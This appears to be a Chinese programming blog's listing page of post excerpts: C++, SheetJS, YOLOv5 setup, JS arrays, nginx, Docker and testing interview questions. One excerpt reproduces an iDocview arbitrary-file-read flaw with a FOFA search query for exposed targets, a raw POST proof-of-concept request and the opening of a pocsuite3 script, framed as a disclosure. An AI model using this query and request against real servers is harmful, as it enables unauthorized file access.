		#include &lt;iostream&gt; class Book { public: void print() { std::cout &lt;&lt; name &lt;&lt; "\n"; //留个印象 auto px = [this]() {std::cout &lt;&lt; this-&gt;age &lt;&lt; "\n"; }; px(); } //留个印象 typedef void (Book::* FUNC)(); void prineData(Book &amp; book, FUNC p) { (book.*p)(); } protected: std::string name = "笔记本"; //数据直接初始化 int age = 10086; }; int main() { Book book; book.print(); //1.简单用auto自动推断 auto func = &amp;Book::print; //得到成员函数指针，必加&amp; //必须要先做函数指针解析 (book.*func)(); //（）必须要有， *必须要有 //留个印象 QT最新版本：槽函数 Book book2; book2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2fe1b8ca9f6403ccfdd889487a11c69a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b401da4cc12c272ec3cae52f06d232ba/" rel="bookmark">
			【SheetJS】【js-xlsx】【xlsx】excel处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 安装引用导出文件设置列宽和行高设置单元格基于elementPlus的文件上传 中文教程：https://github.com/rockboom/SheetJS-docs-zh-CN/
英文详解：https://www.npmjs.com/package/xlsx
安装引用 npm install xlsx import * as XLSX from "xlsx"; 导出文件 let title ="结果.xlsx"; //标题 let aoa = [["序号", "工号", "姓名", "排序", "结果"]]; //表头 // 每行数据 tableData.forEach((item, index) =&gt; { aoa.push([ index + 1, item.id, item.name, item.rank * 1, item.level, ]); }); let worksheet = XLSX.utils.aoa_to_sheet(aoa); // 工作表对象 let workbook = XLSX.utils.book_new(); // 文件对象 XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1"); XLSX.writeFile(workbook, title); // 导出文件 设置列宽和行高 设置列宽，可将数字算为1个字符宽，中文算为2字符宽，导出结果较为美观
worksheet["!cols"] = [{ wch: 10 }, { wch: 20 },.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b401da4cc12c272ec3cae52f06d232ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c91f9ec48830c2e17630e1a91cae7740/" rel="bookmark">
			YOLOV5 CPU版本WIN10环境搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		YOLOV5 CPU版本WIN10环境搭建 要想在CPU上面跑，环境很重要，我先默认大家安装好了pycharm，并且默认配置好了python。我的python版本是3.9（我且称它为原生版本）。
一、配置环境（非常重要）
首先你要去安装一下Anaconda，自己百度
二、换源在cmd中接着依次输入以下代码
conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/
conda config --set show_channel_urls yes
三、完成后在电脑的用户目录下找到.condarc的文件，用记事本打开查看
四、新建conda环境
1、新建
conda create -n yolov5cpu python=3.9
2、激活
activate yolov5cpu
3、导入Pytorch库
进入官网
https://pytorch.org/
输入
conda install pytorch torchvision torchaudio cpuonly -c pytorch 五、下载yolov5工程代码
1、添加conda环境
2、首先先安装matplotlib，速度会快一点，然后运行第二行代码，安装依赖。
pip install -i https://mirrors.aliyun.com/pypi/simple/ matplotlib 3、pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -r requirements.txt 4、可能需要单独安装的
1、ModuleNotFoundError: No module named ‘cv2’
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c91f9ec48830c2e17630e1a91cae7740/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/707d11a26c30fcb2cded9c84a8bc66bd/" rel="bookmark">
			JS数组中各种方法使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在我个人事业发展的过程中，我深刻认识到自身在诸多领域当中所欠缺的丰富知识储备，尤其是针对数组这一重要知识领域，我对其所涵盖的众多方法掌握尚显不足。因此，为了有效地填补这个知识空白区，我进行了深入系统的学习和研究，以期能够更好地应对未来职业生涯中的挑战。同时，我也借此机会告诫所有在校学生，务必在课堂上集中注意力，积极主动地投入课程学习，对于尚未理解或难以把握的知识点，应该及时向老师请教并寻求解答。在课后，始终保持勤奋努力的态度，力求从根本上掌握相关知识内容。否则，可能会面临如同我目前的困境——需要花费数倍于学校时期的时间和精力，特别是在工作之后，我们所能支配的学习时间往往受到更大的限制。值得庆幸的是，我目前尚处于实习阶段，工作负担相对较轻，这为我提供了宝贵的时间去不断充实自我、提升能力。
一、数组方法总结
push()：向数组的末尾添加新元素pop()：删除数组的最后一项unshift()：向数组首位添加新元素shift()：删除数组的第一项slice()：按照条件查找出其中的部分元素splice()：对数组进行增删改filter()：过滤功能join()：用指定的分隔符将数组每一项拼接为字符串concat()：用于连接两个或多个数组indexOf()：检测当前值在数组中第一次出现的位置索引lastIndexOf()：检测当前值在数组中最后一次出现的位置索引every()：判断数组中每一项都是否满足条件some()：判断数组中是否存在满足条件的项includes()：判断一个数组是否包含一个指定的值sort()：对数组的元素进行排序reverse()：对数组进行倒序forEach()：es5及以下循环遍历数组每一项map()：es6循环遍历数组每一项find()：返回匹配的项findIndex()：返回匹配位置的索引reduce()：从数组的第一项开始遍历到最后一项，返回一个最终的值reduceRight()：从数组的最后一项开始遍历到第一项，返回一个最终的值toLocaleString()、toString()：将数组转换为字符串entries()、keys()、values()：遍历数组 二、各种方法详解
（1）push（）：向数组的末尾添加新元素，pop（）：删除数组的最后一项
//1.push用法：向数组的末尾添加新元素 var arr=['大熊','熊二','熊大']; var arr1=arr.push('光头强','翠花') console.log(arr1)//输出结果为5 console.log(arr)//输出结果为["大熊", "熊二", "熊大", "光头强", "翠花"] //2.pop用法：删除数组的最后一项 var arr2=arr.pop(); console.log(arr)//输出结果为：["大熊", "熊二", "熊大", "光头强"] console.log(arr2)//输出结果为：翠花 （2）unshift（）：向数组首位添加新元素，shift（）：删除数组的第一项
//4.unshift:向数组首位添加新元素 var arr=['大熊','熊二','熊大']; var arr3=arr.unshift('吉吉国王') console.log(arr)//输出结果为：["吉吉国王", "大熊", "熊二", "熊大", "光头强"] //5.shift：删除数组第一项 var arr4=arr.shift() console.log(arr)//输出结果为：["大熊", "熊二", "熊大", "光头强"] console.log(arr4)//输出结果为：吉吉国王 （3）slice()：按照条件查找出其中的部分元素，splice()：对数组进行增删改
//6.slice()：按照条件查找出其中的部分元素 //用法：arr.slice(start,end),start是开始截取的数组索引，end是截取最后一个数组索引值加1，可以选择加或者不加 var arr=['大熊','熊二','熊大']; var arr5=arr.slice(1,3) console.log(arr5)//输出结果为：["熊二", "熊大"] var arr6=arr.slice(1) console.log(arr6)//输出结果为：["熊二", "熊大"] //7.splice()：对数组进行增删改 //增加元素 var arrlist=['大熊','熊二','熊大']; arrlist.splice(1,0,'小松鼠','翠花') console.log(arrlist)//输出结果为：["大熊", "小松鼠", "翠花", "熊二", "熊大"] //删除元素 var arrlist1=['大熊','熊二','熊大']; var arr7=arrlist1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/707d11a26c30fcb2cded9c84a8bc66bd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6189721a9385fde1d87dc4c560a91039/" rel="bookmark">
			Find命令查找文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		find命令： sudo find / -name docker-compose.yml
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f38c1b67dc83700496462230bc6917d0/" rel="bookmark">
			漏洞复现-iDocview某接口存在任意文件读取漏洞（附漏洞检测脚本）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免责声明 文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责
漏洞描述 此在线文档预览系统是一套用于在Web环境中展示和预览各种文档类型的系统，如文本文档、电子表格、演示文稿、PDF文件等。此系统某接口存在任意文件读取漏洞。
fofa语句 title="I Doc View" poc语句加检测 POST /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&amp;_session=no HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 strDeptID= strUserId=Admin strUserEsp= strArchivesId= deptIds= IsShowChildrenDept=0 IsCascade=1 poc脚本 脚本用的pocsuite框架
# _*_ coding:utf-8 _*_ # @Time : 2023/12/14 # @Author: 炼金术师诸葛亮 from pocsuite3.api import Output, POCBase, register_poc, requests, logger from pocsuite3.api import get_listener_ip, get_listener_port from pocsuite3.api import REVERSE_PAYLOAD, random_str class iDocview_fileread(POCBase): pocDesc = '''iDocview某接口存在任意文件读取漏洞''' author = '炼金术师诸葛亮' createDate = '2023-12-14' name = 'iDocview某接口存在任意文件读取漏洞' def _verify(self): result = {} url = self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f38c1b67dc83700496462230bc6917d0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5327abd775653a47c486945018772498/" rel="bookmark">
			C&#43;&#43;学习-2023/12/14-C&#43;&#43;类和对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		类和对象 类是一系列具有共同属性和行为的事物的抽象
对象是类的具体化（实例化）
属性：数据成员（int,float）描述，事务的共有特征
行为：成员函数（类中函数），一系列共有事务操作
类的特点：封装继承多态
//类中默认为private属性，结构体中默认是public属性
没有写在范围内默认为private属性 一般写项目都是保护属性 一般情况类外访问类中数据必须通过对象来访问 静态数据成员和静态成员也受权限限定，可以不需要对象也可以调用 class 类名
{
public:
protected：
private:
}；
class MyClass { public: MyClass(); ~MyClass(); private: }; 代码块
#include &lt;iostream&gt; #include &lt;string&gt; class Book { public: Book(); ~Book(); int num = 0; void print(); protected: std::string name = "笔记本"; //数据直接初始化 private: int money = static_cast&lt;int&gt;(2.22); }; void Book::print() { std::cout &lt;&lt; name &lt;&lt; "\t" &lt;&lt; num &lt;&lt; "\t" &lt;&lt; money &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5327abd775653a47c486945018772498/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d73998d62946ecb20404925688f75d8f/" rel="bookmark">
			npm install pnpm -g ：request to https://registry.npmjs.org/pnpm failed, reason: connect ETIMEDOUT
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		npm install pnpm -g 安装初始化vite vue3项目 npm ERR! code ETIMEDOUT
npm ERR! syscall connect
npm ERR! errno ETIMEDOUT
npm ERR! network request to https://registry.npmjs.org/pnpm failed, reason: connect ETIMEDOUT 104.16.29.34:443
在使用 npm cache clean --force 命令时报的错。
可以使用 npm cache verify 命令。
也没有用
修改镜像 //1.查看npm镜像设置
npm config get registry
//2.将npm设置为淘宝镜像
npm config set registry https://registry.npm.taobao.org
//3.再次查看npm镜像设置
npm config get registry
再重新执行：
npm i -g pnpm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50969f91d2c4f0b4eab8814a2589246f/" rel="bookmark">
			nginx反向代理配置以支持websock通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 作者：fyupeng
技术专栏：☞ https://github.com/fyupeng
项目文档：☞ https://rnf.cool
项目同步地址：☞ 预览
在nginx的conf/nginx.cnf配置文件中，配置http模块和server代理模块。
配置 http 模块 添加变量$http_upgrade 和 $connection_upgrade
http{ map $http_upgrade $connection_upgrade { default keep-alive; #默认为keep-alive 可以支持 一般http请求 'websocket' upgrade; #如果为websocket 则为 upgrade 可升级的。 } } 配置 server 代理模块 引用变量
server { listen 80; server_name localhost; location / { proxy_pass http://localhost:8080/; # support websocket proxy_set_header Upgrade $http_upgrade; #此处配置 上面定义的变量 proxy_set_header Connection $connection_upgrade; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2631565865f4462eb9ff2807526a515a/" rel="bookmark">
			显示曾连接过的wifi密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		windows 11 可以直接显示当前连接的密码，或者历史连接保存密码的wifi
也可以使用命令 “nova 9” 是连接过的wifi
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/26ddf280cd4fbbbba55223cce891e610/" rel="bookmark">
			B站武sir-django教程(1)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		day15 初识Django Python知识点：函数、面向对象。前端开发：HTML、CSS、JavaScript、jQuery、BootStrap。MySQL数据库。Python的Web框架： Flask，自身短小精悍 + 第三方组件。Django，内部已集成了很多组件 + 第三方组件。【主要】 1.安装django pip install django c:\python39 - python.exe - Scripts - pip.exe - django-admin.exe 【工具，创建django项目中的文件和文件夹】 - Lib - 内置模块 - site-packages - openpyxl - python-docx - flask - django 【框架的源码】 2.创建项目 django中项目会有一些默认的文件和默认的文件夹。
2.1 在终端 打开终端。
进入某个目录（项目放在哪里）。
/Users/wupeiqi/PycharmProjects/gx 执行命令创建项目
"c:\python39\Scripts\django-admin.exe" startproject 项目名称 # 如果 c:\python39\Scripts 已加入环境系统环境变量。 django-admin startproject 项目名称 # 我自己的电脑 /Library/Frameworks/Python.framework/Versions/3.9/bin/django-admin startproject mysite 2.2 Pycharm 注意：
- Python解释器安装目录：C:\python39\python.exe lib.... /Library/Frameworks/Python.framework/Versions/3.9/ - F:\pycode\ (基于Django创建的项目) /Users/wupeiqi/PycharmProjects 特殊说明：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/26ddf280cd4fbbbba55223cce891e610/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00857119ac870dc6260083182dc3ed79/" rel="bookmark">
			使用docker部署nextcloud
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、思路：数据库使用容器外mysql(宿主机),同时把容器中nextcloud文件目录映射到容器外，即宿主机。
1、创建数据库和用户，并授权
[root@appserver ~]# /usr/local/mysql57/bin/mysql -uroot -p
mysql&gt; create database nextcloud charset utf8;
mysql&gt; grant all on nextcloud.* to nextcloud@‘%’ identified by ‘Joymed123’;
mysql&gt; flush privileges;
2、调整MYSQL增加服务器排序缓冲区(soft_buffer_size)大小。
临时解决：进入MYSQL
SET GLOBAL sort_buffer_size = 2048*2048; 永久解决：
在MYSQL的配置里My.ini加入：
sort_buffer_size=256kb
不做以上设定，会出现内存益处，登录时报内部服务器错误，错语信息如下图：
2、设定宿主机nextcloud目录
[root@appserver ~]# mkdir -p /data/nextcloud 3、这里使用docker-compose来安装启动docker容器
命令“docker run”用来创建和启动一个容器，即管理单个容器，如果有多个相关联的应用容器，则需要依次分别部署。docker-compose可以用来创建启动一组相关联应用容器。它允许用户在一个模版（YAML格式文件，默认配置文件为：docker-compose.yml）中定义好一组相关联的应用容器，。一般我们把这一组应用容器称为一个项目（Project）。通过docker-compose命令来完成这个Project。
创建yml文件
[root@appserver data]# mkdir -p /data/docker_app_yml [root@appserver data]# cd docker_app_yml/ [root@appserver docker_app_yml]# vim docker-compose.yml version: '2' services: app: container_name: "nextcloud" image: nextcloud:22.0.0 # 安装的版本号，可以根据需要选择版本或安装最新版本 restart: always ports: - 9001:80 # 映射到服务器端口 volumes: - /data/nextcloud:/var/www/html # 将代码挂载出来，方便以后修改 environment: # 我使用的是外置数据库，所以要配置下面账密 - MYSQL_PASSWORD=123456 - MYSQL_DATABASE=nextcloud - MYSQL_USER=nextcloud 4、用docker-compose依据yml文件启动容器,会自动下载镜像，启动容器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00857119ac870dc6260083182dc3ed79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af18c72b2f221ab3fe942e6e29791887/" rel="bookmark">
			C&#43;&#43;学习-2023/12/13-C&#43;&#43;类型转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C++类型转换 static_cast 类似C语言强制类型转换
1.可以用做基本数据类型转换
2.把空类型的指针转换为目标指针类型
3.不能转换带有const属性指针
const_cast 提供一个常属性的接口
reinterpret_cast 说基本没用到
dynamic_cast:多态才会接触到 #include &lt;iostream&gt; struct MM { char* name; int age; void setData(const char* mmName, int mmAge) { name = const_cast&lt;char*&gt;(mmName); age = mmAge; } void printfData() { std::cout &lt;&lt; name &lt;&lt; "\t" &lt;&lt; age &lt;&lt; std::endl; } }; //1.基本类型转换 void TestTransform() { //1.基本类型转换 //C int cnum = (int)1.1; std::cout &lt;&lt; cnum &lt;&lt; "\n"; //C++方式 int cppNum = int(1.2); std::cout &lt;&lt; cnum &lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af18c72b2f221ab3fe942e6e29791887/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b332d13c6001b5462e06109a67fe0987/" rel="bookmark">
			Linux_Ubuntu 系统入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu 系统是和 Windows 系统一样的大型桌面操作系统，因此功能非常强大。
本节的目的是掌握后续嵌入式开发所需的 Ubuntu 基本技能，比如系统的基本设置、常用的 shell 命令、vim 编译器的基本操作等等……
Ubuntu 的图形化界面操作和 Windows 下基本一致；
这里着重提一下：
1. 界面分辨率设置：通过右上角设置按键设置对应的分辨率
2. 输入法设置：可以通过 win + 空格；或者右上角设置 中文输入法；
1. Ubuntu(Linux) 终端操作 从这里，我们开始学习 Ubuntu 操作系统的重点 —— 终端操作；
Ubuntu 界面右击 ：打开终端；
上述字符串中：@ 前面的 “quest - qaozus” 是当前的用户名字，@ 后面的 zhangshao - virtual - machine 是机器的名字；最后面的 $ 表示当前用户是普通用户，我们可以在提示符后面输入命令，比如输入命令：ls
ls 命令用于打印出当前所在目录中所有文件和文件夹；
guest-qaozus@zhangshao-virtual-machine:~$ ls examples.desktop 公共的 模板 视频 图片 文档 下载 音乐 桌面 guest-qaozus@zhangshao-virtual-machine:~$ 1.1 Shell 操作 首先先来介绍一个什么叫做 Shell ？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b332d13c6001b5462e06109a67fe0987/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f749b5493d8e473d8c643cadda1c033a/" rel="bookmark">
			Linux-查看YUM仓库中特定软件的版本信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 概述 在安装软件的时候呢，默认使用yum install安装的都是最新的版本，如果想要安装一个之前的版本该怎么做呢？
本文档介绍如何在yum源中查找包含哪些版本，然后通过yum install命令安装特定的版本
2. 查看yum仓库中，软件包有哪些版本 使用--showduplicates参数，查看kubelet有哪些版本
yum --showduplicates list kubelet 查询结果：
[root@nccztsjb-node-26 yum.repos.d]# yum --showduplicates list kubelet Loaded plugins: fastestmirror Loading mirror speeds from cached hostfile * base: 172.20.5.187 * centosplus: 172.20.5.187 * epel: 172.20.5.187 * extras: 172.20.5.187 * updates: 172.20.5.187 Available Packages kubelet.x86_64　1.5.4-0　kubernetes kubelet.x86_64　1.5.4-1　kubernetes kubelet.x86_64　1.6.0-0　kubernetes kubelet.x86_64　1.6.0-1　kubernetes kubelet.x86_64　1.6.1-0　kubernetes ... 中间省略.. kubelet.x86_64　1.23.2-0　kubernetes [root@nccztsjb- 通过以上输出可以看到可用的包，版本。
3. 安装特定的版本的包 通过yum install命令安装特定版本的软件包
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f749b5493d8e473d8c643cadda1c033a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3f343091351917827219995449e4013/" rel="bookmark">
			这套软件测试技巧|软测经典面试题真的有用，今天面试大部分都遇到了！！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		祝同学们都能够顺利找到心仪的工作拿高薪，废话不多说，下面上题了~
46、您以往是否曾经从事过性能测试工作？如果有，请尽可能的详细描述您以往的性能测试工作的完整过程。
（以自己最熟悉的性能测试项目为例）
是的，曾经做过网站方面的性能测试，虽然做的时间并不久（2个月吧），当时呢，是有位网站性能测试经验非常丰富的前辈带着我一起做。
性能测试类型包括负载测试，强度测试，容量测试等
负载测试：负载测试是一种性能测试指数据在超负荷环境中运行，程序是否能够承担。
强度测试： 强度测试是一种性能测试，他在系统资源特
容量测试：确定系统可处理同时在线的最大用户数
在网站流量逐渐加大的情况下，开始考虑做性能测试了，首先要写好性能测试计划，根据运营数据得出流量最大的页面（如果是第一次的话，一般是首页，下载页，个人帐户页流量最大，而且以某种百分比）
Web服务器指标指标：
47、你对测试最大的兴趣在哪里？为什么？
最大的兴趣就是测试有难度，有挑战性！做测试越久越能感觉到做好测试有多难。曾经在无忧测试网上看到一篇文章，是关于如何做好一名测试工程师。一共罗列了11，12点，有部分是和人的性格有关，有部分需要后天的努力。但除了性格有关的1，2点我没有把握，其他点我都很有信心做好它。
刚开始进入测试行业时，对测试的认识是从无忧测试网上了解到的一些资料，当时是冲着做测试需要很多技能才能做的好，虽然入门容易，但做好很难，比开发更难，虽然当时我很想做开发（学校专业课我基本上不缺席，因为我喜欢我的专业），但看到测试比开发更难更有挑战性，想做好测试的意志就更坚定了。
不到一年半的测试工作中，当时的感动和热情没有减退一点（即使环境问题以及自身经验，技术的不足，做测试的你一定也能理解）。
我觉得做测试整个过程中有2点让我觉得很有难度（对我来说，有难度的东西我就非常感兴趣），第一是测试用例的设计，因为测试的精华就在测试用例的设计上了，要在版本出来之前，把用例写好，用什么测试方法写？（也就是测试计划或测试策略），如果你刚测试一个新任务时，你得花一定的时间去消化业务需求和技术基础，业务需求很好理解（多和产品经理和开发人员沟通就能达到目的），而技术基础可就没那么简单了，这需要你自觉的学习能力，比如说网站吧，最基本的技术知识你要知道网站内部是怎么运作的的，后台是怎么响应用户请求的？测试环境如何搭建？这些都需要最早的学好。至少在开始测试之前能做好基本的准备，可能会遇到什么难题？需求细节是不是没有确定好？这些问题都能在设计用例的时候发现。
第二是发现BUG的时候了，这应该是测试人员最基本的任务了，一般按测试用例开始测试就能发现大部分的bug，还有一部分bug需要测试的过程中更了解所测版本的情况获得更多信息，补充测试用例，测试出bug。还有如何发现bug？这就需要在测试用例有效的情况下，通过细心和耐心去发现bug了，每个用例都有可能发现bug，每个地方都有可能出错，所以测试过程中思维要清晰（测试过程数据流及结果都得看仔细了，bug都在里面发现的）。如何描述bug也很有讲究，bug在什么情况下会产生，如果条件变化一点点，就不会有这个bug，以哪些最少的操作步骤就能重现这个bug，这个bug产生的规律是什么？如果你够厉害的话，可以帮开发人员初步定位问题。
48、你以前工作时的测试流程是什么？
（灵活回答）
公司对测试流程没有规定如何做，但每个测试人员都有自己的一套测试流程。我说下我1年来不断改正（自己总结，吸取同行的方法）后的流程吧。需求评审（有开发人员，产品经理，测试人员，项目经理）－&gt;需求确定(出一份确定的需求文档)－&gt;开发设计文档（开发人员在开始写代码前就能输出设计文档）－&gt;想好测试策略，写出测试用例－&gt;发给开发人员和测试经理看看（非正式的评审用例）－&gt;接到测试版本－&gt;执行测试用例（中间可能会补充用例）－&gt;提交bug（有些bug需要开发人员的确定（严重级别的，或突然发现的在测试用例范围之外的，难以重现的），有些可以直接录制进TD）－&gt;开发人员修改（可以在测试过程中快速的修改）－&gt;回归测试（可能又会发现新问题，再按流程开始跑）。
49、当开发人员说不是BUG时，你如何应付？
开发人员说不是bug，有2种情况，一是需求没有确定，所以我可以这么做，这个时候可以找来产品经理进行确认，需不需要改动，3方商量确定好后再看要不要改。二是这种情况不可能发生，所以不需要修改，这个时候，我可以先尽可能的说出是BUG的依据是什么？如果被用户发现或出了问题，会有什么不良结果？程序员可能会给你很多理由，你可以对他的解释进行反驳。如果还是不行，那我可以给这个问题提出来,跟开发经理和测试经理进行确认,如果要修改就改,如果不要修改就不改。其实有些真的不是bug，我也只是建议的方式写进TD中，如果开发人员不修改也没有大问题。如果确定是bug的话，一定要坚持自己的立场，让问题得到最后的确认。
50、结构化程序设计和面向对象程序设计各自的特点及优缺点是什么？
（不需要回答如此复杂）
结构化程序设计思想采用了模块分解与功能抽象和自顶向下、分而治之的方法，从而有效地将一个较复杂的程序系统设计任务分解成许多易于控制和处理的子程序，便于开发和维护。它的重点在于把功能进行分解。但是由于在实际开发过程当中需求会经常发生变化，因此，它不能很好的适应需求变化的开发过程。结构化程序设计是面向过程的。
面向对象程序设计以需求当中的数据作为中心，来进行设计，具有良好的代码重用性。
封装性：也叫数据隐藏，用户无需知道内部工作流程，只要知道接口和操作就可以的。
继承性： 一种支持重用的思想，在现有的类型派生出新的子类，例如新型电视机在原有型号的电视机上增加若干中功能而得到，新型电视机是原有电视机的派生，继承了原有电视机的属性，并增加了新的功能。
多态性：指在一般类中定义的属性或行为，被特殊类继承之后，可以具有不同的数据类型或表现出不同的行为。
动态联编：指一个计算机程序自身彼此关联的过程，按照联编所进行的阶段不同，可分为两种不同的联编方法：静态联编和动态联编。
51、描述TCP/IP协议的层次结构，以及每一层中重要协议。
52、简述子网掩码的用途。
子网掩码主要用来判断两个IP地址是否处在同一个局域网当中；子网掩码是由连续的2进制1组成的。子网掩码和IP地址进行按位与运算后，结果一致，表示处于一个局域网当中，如果不一致，表示不再一个局域网当中，需要寻找路由。
53、说出4种以上常用的操作系统及其主要的应用范围（微软的操作系统除外）。
Linux（Red Hat、SUSE、Debian、Trubo Linux）：主要用于搭建各类服务器
MAC OS：苹果机的操作系统，用于图像处理
Unix（AIX：IBM服务器的专用操作系统；
Solaris：Sun操作系统；FreeBSD、NetBSD）
54、在Linux系统中，一个文件的访问权限是755，其含义是什么？
755表示该文件所有者对该文件具有读、写、执行权限，该文件所有者所在组用户及其他用户对该文件具有读和执行权限。
55、Windows操作系统中PATH环境变量的作用是什么？
PATH是Windows操作系统环境变量，PATH作用是用户在命令行窗口执行一个命令，则在PATH变量设置的目录下依次寻找该命令或对应的执行文件，若找到，则执行，若没有找到，则命令行窗口返回无效命令。
56、在centos中，从root用户切到userl用户，一般用什么命令？
su
su user1 切换到user1，但切换后的当前目录还是root访问的目录
su – user1 切换到user1，并且当前目录切换到user1的根目录下（/home/user1/）
57、Linux中，一般怎么隐藏文件？
文件名以一个.开头
58、DNS是什么,它是如何工作的?
域名解析服务。用于将域名解析为IP，或反和将IP解析为域名。
客户机可指定DNS服务器来解析，或用本机hosts文件进行解析。
59、简述一下c/s模式或者b/s模式？
C/S模式：客户端/服务器模式。工作原理：Client向Server提交一个请求；Server则使用一些方法处理这个请求，并将效果返回给Client。
B/S结构，即Browser/Server(浏览器/服务器)结构，是随着Internet技术的兴起，对C/S结构的一种变化或者改进的结构。在这种结构下，用户界面完全通过WWW浏览器实现，一部分事务逻辑在前端实现，但是主要事务逻辑在服务器端实现，形成所谓3-tier结构。B/S结构，主要是利用了不断成熟的WWW浏览器技术，结合浏览器的多种Script语言(VBScript、JavaScript…)和ActiveX技术，用通用浏览器就实现了原来需要复杂专用软件才能实现的强大功能，并节约了开发成本，是一种全新的软件系统构造技术。
60、TCP/UDP有哪些区别？
TCP-有连接,所以握手过程会消耗资源,过程为可靠连接,不会丢失数据,适合大数据量交换
UDP-非可靠连接,会丢包,没有校验,速度快,无须握手过程
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef209f8303717dc713b6875202336438/" rel="bookmark">
			2024最强版软件测试面试攻略，助你直通大厂！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多小伙伴都面临着这样的情况。他们拼命争取面试机会，却因种种原因翻车：“我无法在面试中展现出真正的实力。”在回答面试官的问题时，不能抓住重点。 “紧张，口吃，不知道如何最好地展示自己。”在上述所有情况下，正是因为我们忽视了如何磨练我们的面试技巧，因而错过了向往的公司。为此，小编整理了2022最强版软件测试面试攻略，助你直通大厂！
11、根据你的经验说说你对软件测试/质量保证的理解
软件质量保证与测试是根据软件开发阶段的规格说明和程序的内部结构而精心设计的一批测试用例(即输入数据和预期的输出结果)，并根据这些测试用例去运行程序，以发现错误的过程。它是对应用程序的各个方面进行测试以检查其功能、语言有效性及其外观排布。
12、软件测试的流程是什么?
